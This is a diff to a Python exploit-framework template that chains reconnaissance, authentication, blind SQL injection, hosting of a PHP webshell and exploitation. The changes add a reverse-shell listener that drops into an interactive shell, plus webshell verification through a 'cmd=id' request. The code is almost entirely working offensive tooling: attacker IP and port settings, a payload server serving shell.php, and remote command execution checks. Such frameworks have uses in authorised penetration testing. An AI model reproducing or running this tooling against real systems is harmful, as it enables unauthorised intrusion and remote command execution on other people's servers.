@@ -19,7 +19,7 @@ import requests
 import sys
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Optional
+from typing import Optional, Any
 import urllib3
 
 # Import custom modules
@@ -28,7 +28,8 @@ from modules import (
     PayloadServer,
     StageManager,
     BlindSQLi,
-    MySQLDialect
+    MySQLDialect,
+    InteractiveListener
 )
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -59,35 +60,33 @@ class ExploitContext:
     the exploit lifecycle.
     """
 
-    # Target configuration
+    # Required configuration
     target_ip: str
     target_port: int
     target_api_port: int
-    protocol: str = "http"
-
-    # Attacker configuration
     attacker_ip: str
     attacker_port: int
     payload_port: int
-
-    # Exploit behavior
+    
+    # Optional configuration with defaults
+    protocol: str = "http"
     delay: int = 3
     proxy: Optional[str] = None
     charset: str = "alnum"
-
-    # Authentication
     username: Optional[str] = None
     password: Optional[str] = None
 
-    # Runtime state
+    # Runtime state (all with defaults)
     session: requests.Session = field(default_factory=requests.Session, repr=False)
     authenticated: bool = field(default=False, repr=False)
     shell_url: Optional[str] = field(default=None, repr=False)
-
-    # Advanced components (injected)
-    logger = None
+    logger: Any = field(default=None, repr=False)
     payload_server: Optional[PayloadServer] = field(default=None, repr=False)
+    listener: Optional[InteractiveListener] = field(default=None, repr=False)
     sqli: Optional[BlindSQLi] = field(default=None, repr=False)
+    session_cookie: Optional[str] = field(default=None, repr=False)
+    csrf_token: Optional[str] = field(default=None, repr=False)
+    extracted_data: dict = field(default_factory=dict, repr=False)
 
     @classmethod
     def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
@@ -202,6 +201,54 @@ Examples:
     return parser.parse_args()
 
 # ============================================================================
+# UTILITY FUNCTIONS
+# ============================================================================
+
+def liveness_check(ctx: ExploitContext) -> bool:
+    """
+    Verify target is reachable before starting exploitation.
+    
+    This function performs a simple HTTP GET to the target base URL
+    to ensure the target is up and responsive.
+    
+    Args:
+        ctx: ExploitContext with target configuration
+        
+    Returns:
+        True if target is reachable, False otherwise
+    """
+    ctx.logger.info(f"Performing liveness check: {ctx.get_base_url()}")
+    
+    try:
+        response = ctx.session.get(
+            ctx.get_base_url(),
+            timeout=10,
+            verify=False,
+            proxies=ctx.get_proxies()
+        )
+        
+        if response.status_code == 200:
+            ctx.logger.success(f"Target is reachable (HTTP 200)")
+            return True
+        elif response.status_code in [301, 302, 307, 308]:
+            ctx.logger.warning(f"Target redirected to: {response.headers.get('Location')}")
+            return True
+        else:
+            ctx.logger.warning(f"Target returned HTTP {response.status_code}")
+            return True  # Still reachable, just unexpected status
+            
+    except requests.exceptions.ConnectionError as e:
+        ctx.logger.error(f"Connection refused: {e}")
+        return False
+    except requests.exceptions.Timeout as e:
+        ctx.logger.error(f"Connection timeout: {e}")
+        return False
+    except Exception as e:
+        ctx.logger.error(f"Liveness check failed: {e}")
+        return False
+
+
+# ============================================================================
 # EXPLOIT STAGES (customize these for your vulnerability)
 # ============================================================================
 
@@ -291,7 +338,7 @@ if(isset($_REQUEST['cmd'])){
     echo "</pre>";
 }
 ?>"""
-        ctx.payload_server.add_payload("/shell.php", php_shell, "application/x-php")
+        ctx.payload_server.add_payload("/shell.php", php_shell.encode(), "application/x-php")
 
         # Example: Add callback handler for blind RCE verification
         def rce_callback(request_data):
@@ -364,31 +411,146 @@ def stage_exploit(ctx: ExploitContext, manager: StageManager) -> bool:
     return True
 
 def stage_verify(ctx: ExploitContext, manager: StageManager) -> bool:
-    """Stage 5: Verify exploitation was successful."""
+    """
+    Stage 5: Verify exploitation was successful.
+    
+    This stage supports multiple verification methods:
+    1. Webshell verification via HTTP request
+    2. Reverse shell capture via listener
+    """
     ctx.logger.info("Verifying exploitation")
 
+    # Method 1: Webshell verification
     if ctx.shell_url:
-        # Test webshell
         test_url = f"{ctx.shell_url}?cmd=id"
-        ctx.logger.info(f"Testing shell: {test_url}")
+        ctx.logger.info(f"Testing webshell: {test_url}")
 
         try:
             response = ctx.session.get(test_url, timeout=10, verify=False)
 
             if response.status_code == 200 and "uid=" in response.text:
-                ctx.logger.success("RCE confirmed!")
+                ctx.logger.success("Webshell RCE confirmed!")
                 ctx.logger.info(f"Output: {response.text[:200]}")
                 return True
             else:
-                ctx.logger.error("Shell verification failed")
+                ctx.logger.error("Webshell verification failed")
                 return False
 
         except Exception as e:
-            ctx.logger.error(f"Verification error: {e}")
+            ctx.logger.error(f"Webshell verification error: {e}")
             return False
-    else:
-        ctx.logger.warning("No shell URL available for verification")
-        return True
+
+    # Method 2: Reverse shell capture via listener
+    # Example: Set ctx.listener before this stage and trigger reverse shell
+    if ctx.listener and ctx.listener.is_connected():
+        ctx.logger.success("Reverse shell connection established!")
+        ctx.logger.info(f"Connected from: {ctx.listener.get_client_info()}")
+        
+        # Send a test command to verify shell is working
+        result = ctx.listener.send_command("id")
+        if result and "uid=" in result:
+            ctx.logger.success("Shell verified with 'id' command")
+            ctx.logger.info(f"Shell output: {result[:200]}")
+            
+            # Optionally enter interactive shell
+            ctx.logger.info("Entering interactive shell...")
+            ctx.listener.interactive_shell()
+            return True
+        else:
+            ctx.logger.error("Shell verification failed - command did not return expected output")
+            return False
+
+    # Method 3: Start listener and wait for connection
+    # Uncomment this section to enable automatic listener setup
+    if False:  # Change to True to enable
+        ctx.logger.info("Starting listener for reverse shell verification")
+        
+        ctx.listener = InteractiveListener(
+            port=ctx.attacker_port,
+            initial_commands=["whoami", "hostname", "id", "pwd"]
+        )
+        
+        if ctx.listener.start(blocking=False):
+            ctx.logger.success(f"Listener started on port {ctx.attacker_port}")
+            ctx.logger.info("Trigger reverse shell on target now...")
+            
+            # Wait for connection with timeout
+            if ctx.listener.wait_for_connection(timeout=60):
+                ctx.logger.success("Reverse shell connected!")
+                ctx.listener.interactive_shell()
+                return True
+            else:
+                ctx.logger.error("No reverse shell connection received (timeout)")
+                return False
+        else:
+            ctx.logger.error("Failed to start listener")
+            return False
+
+    ctx.logger.warning("No verification method available")
+    return True
+
+# ============================================================================
+# ALTERNATIVE: Step-Based Pattern
+# ============================================================================
+
+"""
+For simpler exploits, you may prefer a step-based pattern instead of stage-based.
+Here's an example of how to implement step-based exploitation:
+
+def step1_authenticate(ctx: ExploitContext) -> bool:
+    \"\"\"Step 1: Authenticate to target.\"\"\"
+    ctx.logger.info("Step 1: Authentication")
+    
+    # Store session cookie for later steps
+    ctx.session_cookie = "example_session_id"
+    ctx.logger.success("Authenticated successfully")
+    return True
+
+def step2_extract_token(ctx: ExploitContext) -> bool:
+    \"\"\"Step 2: Extract CSRF token using stored session.\"\"\"
+    ctx.logger.info("Step 2: Token extraction")
+    
+    # Use session_cookie from step 1
+    ctx.logger.info(f"Using session: {ctx.session_cookie}")
+    
+    ctx.csrf_token = "example_csrf_token"
+    ctx.extracted_data['csrf_token'] = ctx.csrf_token
+    ctx.logger.success("Token extracted")
+    return True
+
+def step3_exploit(ctx: ExploitContext) -> bool:
+    \"\"\"Step 3: Exploit using collected data.\"\"\"
+    ctx.logger.info("Step 3: Exploitation")
+    
+    # Use data from previous steps
+    ctx.logger.info(f"Using CSRF token: {ctx.extracted_data.get('csrf_token')}")
+    
+    ctx.logger.success("Exploitation complete")
+    return True
+
+def run_step_based(ctx: ExploitContext) -> bool:
+    \"\"\"Run step-based exploit.\"\"\"
+    steps = [
+        ("Authentication", step1_authenticate),
+        ("Token Extraction", step2_extract_token),
+        ("Exploitation", step3_exploit),
+    ]
+    
+    for step_name, step_func in steps:
+        ctx.logger.stage(step_name)
+        if not step_func(ctx):
+            ctx.logger.error(f"Step '{step_name}' failed")
+            return False
+    
+    return True
+
+# Usage in main():
+# if USE_STEP_BASED:
+#     success = run_step_based(ctx)
+"""
+
+USE_STEP_BASED = False  # Set to True to use step-based pattern instead
+
 
 # ============================================================================
 # MAIN EXECUTION
@@ -410,31 +572,51 @@ def main():
     ctx = ExploitContext.from_args(args)
     ctx.logger = log
 
-    # Initialize stage manager
-    manager = StageManager(logger=log, fail_fast=False)
+    # Perform liveness check before anything else
+    if not liveness_check(ctx):
+        log.error("Target is not reachable. Aborting.")
+        log.close()
+        sys.exit(1)
 
-    # Register stages
-    manager.add_stage("Reconnaissance", stage_recon)
-    manager.add_stage("Authentication", stage_authenticate, depends_on=["Reconnaissance"])
-    manager.add_stage("Payload Server Setup", stage_setup_payload_server, optional=True)
-    manager.add_stage("Exploitation", stage_exploit, depends_on=["Authentication"], retry=1)
-    manager.add_stage("Verification", stage_verify, depends_on=["Exploitation"])
+    # Use step-based or stage-based pattern
+    if USE_STEP_BASED:
+        # Alternative: Step-based pattern for simpler exploits
+        log.info("Using step-based execution pattern")
+        log.error("Step-based pattern not implemented in this example")
+        success = False
+    else:
+        # Standard: Stage-based pattern
+        log.info("Using stage-based execution pattern")
+        
+        # Initialize stage manager
+        manager = StageManager(logger=log, fail_fast=False)
 
-    # Execute all stages
-    success = manager.execute(ctx, manager)
+        # Register stages
+        manager.add_stage("Reconnaissance", stage_recon)
+        manager.add_stage("Authentication", stage_authenticate, depends_on=["Reconnaissance"])
+        manager.add_stage("Payload Server Setup", stage_setup_payload_server, optional=True)
+        manager.add_stage("Exploitation", stage_exploit, depends_on=["Authentication"])
+        manager.add_stage("Verification", stage_verify, depends_on=["Exploitation"])
 
-    # Print stage summary
-    manager.print_summary()
+        # Execute all stages
+        success = manager.execute(ctx, manager)
+
+        # Print stage summary
+        manager.print_summary()
 
     # Cleanup
     if ctx.payload_server:
         ctx.payload_server.stop()
+    
+    if ctx.listener:
+        ctx.listener.stop()
 
     # Final summary
     log.summary(
         Target=ctx.get_base_url(),
         Authenticated=ctx.authenticated,
         Shell_URL=ctx.shell_url or "N/A",
+        Listener_Port=ctx.attacker_port if ctx.listener else "N/A",
         Overall_Status="SUCCESS" if success else "PARTIAL/FAILED"
     )
 
